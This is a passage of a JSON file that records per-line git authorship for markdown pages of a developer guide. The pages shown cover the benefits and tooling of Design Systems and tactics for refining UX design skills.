        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 3. Conversation at Modus Create_ ([source](https://moduscreate.com/blog/design-systems-and-how-your-company-benefits-from-them/))"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Not Front-End Frameworks or Style Guides?"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "Front-end frameworks such as [Bootstrap](https://getbootstrap.com/) have reusable components that save a lot of time and effort. However, there are a few disadvantages:"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Not suitable for designers**: [Sketch](https://www.sketch.com/) is an industry standard tool used by designers for UI design. Most front-end frameworks do not have relevant *.sketch* or source files that allow them to change the design of components in the framework."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "2. **Not suitable for extensive customization**: Products with a distinctive level of identity require additional development effort, which defeats the point of using a framework."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "3. **Not suitable for apps that emphasize on performance**: Front-end frameworks come with elements that the team may not need. The unused code could reduce overall performance."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "Note that the style guide mentioned here is a term used in the past when Design Systems had not been explored yet. The Style Guide of a Design System is more focused and emphasizes on graphic styles only."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Style guides present components that can be used quickly in mockups. This is an example of Tor\u0027s [style guide](https://styleguide.torproject.org/components/).  However, there are a few disadvantages:"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Not easily traceable**: It is hard to trace where the components came from as different types of components may be built over time by different teams."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "2. **Not easily documented**: Most of the time, style guides lack documentation on what each component does. Also, too much documentation may decrease reusability of components because it is infeasible for designers/developers to go through a lot of pages to find a component they wish to use."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "## Benefits of a Design System"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "Design Systems combine the good parts of front-end frameworks and style guides."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "**Benefit 1: Shared Common Language**"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Design Systems act as a [Single Source of Truth](https://en.wikipedia.org/wiki/Single_source_of_truth). This allows the whole organization to access changes and updates. Any member of a team would have complete documentation of design mock-ups at their fingertips. This results in fewer misunderstandings and much better implementation of designs."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "Design Systems also [elimate knowledge silos](https://moduscreate.com/blog/design-systems-and-how-your-company-benefits-from-them/). There is a lesser risk of context gaps being formed because information is shared across teams."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "**Benefit 2: Reusability**"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "Design Systems provides a shared library of reusable components. When every component in a design system is reusable, teams can use these reusable components to quickly assemble and implement new pages."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "As a result, this process substantially decreases the possibility of teams having to duplicate components, which means extra resources for focusing on more valuable things such as customer experience."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "**Benefit 3: Faster Development**"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "When products are integrated with a Design System, updates are only required to be carried out in one place. This [blog post](https://moduscreate.com/blog/design-systems-and-how-your-company-benefits-from-them/) from Modus Create explains how Design Systems helped them to achieve faster development speed."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "In a [blog post](https://airbnb.design/building-a-visual-language/) from Airbnb, the team explained how they were able to create nearly 50 screens within just a few hours by using their Design System. It was also mentioned by the team that they build and release features on all native platforms at roughly the same time now. Development is faster for them now since product engineers can focus more on writing the feature logic rather than code that is responsible for the presentation layer of the application."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Build a Design System?"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "There are paid solutions out there to help organizations build Design Systems. However, there are open source tools to assist you in building your own Design System."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "They are [Storybook](https://github.com/storybooks/storybook) and [React Styleguidist](https://github.com/styleguidist/react-styleguidist). Here is a good [blog post](https://blog.hichroma.com/storybook-vs-styleguidist-2bd93d6dcc06) describing the difference between these tools and how they complement each other in setting up a Design System."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "**Storybook**"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://raw.githubusercontent.com/storybooks/storybook/next/media/storybook-intro.gif\" alt\u003d\"Storybook\" width\u003d\"95%\"\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 4. Storybook_ ([source](https://github.com/storybooks/storybook))"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "[Storybook](https://github.com/storybooks/storybook) is a development environment for UI components. It helps you build UI components in isolation and offers handy features to visualize any mock data you supply. It helps in setting up the pattern library of a Design System."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "**React Styleguidist**"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://camo.githubusercontent.com/0ded3b0835a4ace4664a6833985affbde783ed47/68747470733a2f2f64337676366c703535716a6171632e636c6f756466726f6e742e6e65742f6974656d732f303631663041326e3142304833703054317031662f72656163742d7374796c65677569646973742d6c6f676f2e706e67\" alt\u003d\"React Styleguidist\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 5. React Styleguidist_ ([source](https://github.com/styleguidist/react-styleguidist))"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "[React Styleguidist](https://github.com/styleguidist/react-styleguidist) simplifies creating and maintaining a UI documentation site. It allows you to create pages in Markdown and import UI components. It helps in setting up the style guide of a Design System."
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Examples of Existing Design Systems"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "This [website](https://designsystemsrepo.com/design-systems/) presents a comprehensive and curated list of design systems."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Out of the list, there are some noteworthy open-source Design Systems that you can use, contribute or take reference from:"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Material Design](https://material.io/design/): Created by Google. Components implemented from Material Design are found [here](https://github.com/material-components)."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "2. [Photon Design System](https://design.firefox.com/photon/): Used to build Firefox products. Components found [here](https://github.com/firefoxux)."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "3. [Lightning Design System](https://www.lightningdesignsystem.com/): Used to build products/apps related to Salesforce. The component library can be found [here](https://github.com/salesforce/design-system-react). Note that they use Storybook in setting up the pattern library."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "4. [Shopify Polaris](https://polaris.shopify.com/): Used to build products/apps related to Shopify. The component library can be found [here](https://github.com/Shopify/polaris-react). Note that they use Storybook in setting up the pattern library."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "## Summary"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "Design Systems keep things in order by acting as a Single Source of Truth, providing a common shared language across the organization. It encourages reusability of components, resulting in faster development time."
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 6,
      "iskandarzulkarnaien": 11,
      "-": 127
    }
  },
  {
    "path": "contents/uix/refining-ux-skills.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Refining UX Design Skills"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Refining UX Design Skills"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Tan Jun Kiat](https://github.com/junkiattan)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Building a relationship with a UX mentor](#building-a-relationship-with-a-ux-mentor)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* [Becoming a UX apprentice](#becoming-a-ux-apprentice)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "* [Engaging in individual UX projects](#engaging-in-individual-ux-projects)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "* [Summary](#summary)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "* [Additional Resource(s)](#additional-resource-s)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "As someone new to UX Design, honing your design skills is crucial to getting a UX-related career. In addition to knowing the definition of UX Design and it\u0027s stages, it is also important to know the practical aspect of starting and refining the required skillsets. This section will explain a few tactics to help you on this journey of improvement."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Summary of Keypoints"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "1. Building a relationship with a UX mentor"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "1. Becoming a UX apprentice"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "1. Engaging in individual UX projects"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Each keypoint represents a tactic to help you refine your UX skillsets, supplemented with the potential pitfalls of each tactic and solutions to consider."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Building a Relationship With a UX Mentor"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Mentors are invaluable because they are able to use their experience to fill in any knowledge gaps a budding UX designer would have at the beginning. Chances are that they have already asked the same questions you are having and can therefore provide constructive feedback on workable solutions. Even if they have not tried tackled the same issues, they stand in a better position to provide sound advice by using any transferable lessons learnt in their own expert areas."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "There are many avenues to find a UX mentor. Listed below are some links to get you started on some ways you can find a potential mentor."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Mentoring networks:"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Find a Mentor (RookieUp)](https://www.rookieup.com/find-a-mentor/)"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. [UXPA UK Mentoring programme](https://uxpa-uk.org/development/mentoring/)"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "1. [IDF Design League program](https://www.interaction-design.org/design-league?ep\u003daz)"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "1. [UX Mentorship Program (The UX Review)](https://theuxreview.co.uk/ux-mentorship-program-by-uxr/)"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "Conferences"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Nielsen Norman Group UX Conferences](https://www.nngroup.com/ux-conference/)"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "Local meet-ups"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "1. [UXSG Community](http://www.uxsg.org/)"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "1. [IxDA Singapore](https://www.meetup.com/IxDA-Singapore/)"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Singapore Lean Startup Circle](https://www.meetup.com/Singapore-Lean-Startup-Circle/)"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Singapore Dribbble Meetup](https://www.facebook.com/groups/dribbble.sg/)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "If you are concerned with how to find the right mentor, check out below articles that offer tips on how to select the right mentor for yourself."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "1. [How to Find a UX Mentor](https://www.uxbeginner.com/how-to-find-a-ux-mentor/)"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "1. [How (and Why) You Want to Find a Great Design Mentor](https://medium.com/@myplanet/how-and-why-you-want-to-find-a-great-design-mentor-6faa7c0fffd9)"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Potential Pitfalls"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "*Unresponsive or ineffective mentors*: Not everyone would be cut out to be a mentor, hence it is up to you to determine if your needs are being met by a specific mentor. The key thing is to always be proactive on your side by following up with your mentor, and having the courage to move on if you feel that the specific mentorship isn\u0027t working out."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Becoming a UX Apprentice"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "This tactic may sound similar to the first one, but apprenticeship here connotes a stronger meaning for a formal learning experience. While the previous point talks about getting on-the-job advice from more experienced individuals, this tactic mainly discusses learning bootcamps that focuses on bringing an individual from \"UX Zero\" to \"UX Hero\" within the span of a few months."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "Bootcamps can be classified into online or in-person, each with its advantages and disadvantages."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "#### Online"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Broadly speaking, the main advantages of online courses are it\u0027s convenience and price. Online courses cater to students globally and are generally more affordable than in-person courses. Most online courses are also self-paced based on each student\u0027s schedule. However, online courses lack the in-person interactions which can impact the learning experience. Completing online courses also requires long term self-discipline, which places more responsibility on the student. Hence, completion rates are generally not as high compared to in-person courses."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### In-Person"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "The main advantages of in-person courses are the interactions, which can help to solidify learning experiences and concepts. For UX Design specifically, students might benefit learning skills like drafting user-scenarios or prototyping with in-class guidance rather than through the web. As a result of in-person learning and collaboration, students would also be more motivated and completion rates for in-person courses are higher in general. However, such courses are limited by price and their locations."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "#### Recommendations"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "There are many bootcamps of both classifications for considerations. I have listed a few famous ones below for consideration that are more applicable for Singaporean students."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "Online:"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "1. [UX Design (Career Foundry)](https://careerfoundry.com/en/courses/become-a-ux-designer/)"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Designer Track (Bloc)](https://www.bloc.io/designer-track)"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. [UX Design Bootcamp (Designation)](https://designation.io/)"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "1. [UX Design Course (BrainStation)](https://brainstation.io/course/online/remote-user-experience-design-bootcamp)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "In-person:"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "1. [UX Design Immersive (General Assembly)](https://generalassemb.ly/education/user-experience-design-immersive)"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Product Design (Alpha Camp)](https://sg.alphacamp.co/full-time-product-design/)"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Human Centered Design (Hyper Island)](https://www.hyperisland.com/programs-and-courses/human-centered-design)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Potential Pitfalls"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "*Ineffective learning experiences*: A common mistake is signing up for any program thinking that all UX Design programs are the same. The curriculum of most courses were developed separately, hence their teaching methodology and focus would be different from each other. Consider requesting the course syllabus for each couse and asking a few questions:"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "* What kinds of portfolio deliverables will you produce through the program? Will you actually produce things you can showcase as evidence of your problem-solving skills?"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "* Does the program have a trusted network of potential employers that you can be connected with?"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "* How practical are the experiences promised by the program? How conceptual? How product-based? How process-based?"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "Be honest with your expectations on what you wish to get out of the course and find a suitable one based on your answers to the questions above."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Engaging in Individual UX Projects"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "This is the tactic that shows your proactiveness and desire to excel in UX Design. Whether you have a mentor or have participated in a UX Bootcamp, nothing shows your commitment to UX Design more than if you had further honed those learned skills in actual UX projects."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "Find a local organisation with a website/app that you believe needs design help. Approach them via call/email to let them know that you are new to design but would like to gain some experience by providing advice on how certain aspects of their websites can be improved, bearing in mind that it\u0027s good to always frame design issues as business issues. Afterwards, simply treat it as your own UX project and work with the organisation to produce value-added content such as prototypes that can help to showcase your ideas. By doing it well, you can gain experience and even add value to your resume."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "Listed below are some examples of UX projects that can be self-initiated."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "1. [10 UX/UI Projects to Help You Build Your Portfolio](https://www.rookieup.com/blog/10-uxui-projects-help-build-portfolio/)"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "1. [5 Hidden Sources of UX Portfolio Projects](https://www.uxbeginner.com/5-hidden-sources-of-ux-portfolio-projects/)"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. [Two Projects to Hone your UX Skills](https://thehipperelement.com/post/145959249463/two-projects-to-hone-your-ux-skills)"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Potential Pitfalls:"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "*Projects that don’t count as legitimate UX experience*: It is important to be careful of the type of projects you end up taking. Producing content for non-digital media, such as a brochure or an advertisement, would not be as relevant as producing wireframes for a website. Furthermore, even with a relevant UX experience, it is crucial to be able to link your work to communicate the following points:"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "* How you helped the team balance user goals and business goals"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "* How you analyzed the business and technology constraints"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "* How you collaborated with non-designers"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "* How you transformed user research and quantitative data into actionable insights for the team"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "* How you worked with the team to resolve unexpected challenges"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "Applying UX skills and being able to communicate your ideas/results clearly to your clients based on the questions listed above helps you to sell the true value of your design work."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "## Summary"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Being a UX designer requires tenacity as a lot of the responsibility, i.e. be it approaching a right mentor, determining a right course syllabus for yourself or approaching a local organisation for potential work, ultimately falls on you. Therefore, knowing the tactics and solutions to common pitfalls would definitely help clarify the steps needed to refine your UX skills. Bear in mind that the tactics are not used exclusively, as all of them can be applied simultaneously in your journey of mastering UX Design."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "Know that there are many others before you who were new but successfully went into UX Design through their tenacity and hard work. Check out the below links for some success stories of individuals who started with zero experience but managed to secure full-time UX jobs. Use those stories as inspiration to motivate your own UX journey!"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "* [How I landed a job in UX Design with no degree or work experience](https://blog.prototypr.io/how-i-landed-a-job-in-ux-design-with-no-degree-or-work-experience-ca22c22a1c68)"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "* [How I Landed a UX Job in 8 Months Without Work Experience or a Degree](https://medium.com/capitalonedesign/how-i-landed-a-ux-job-in-8-months-without-work-experience-or-a-degree-a057d32df1f9)"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
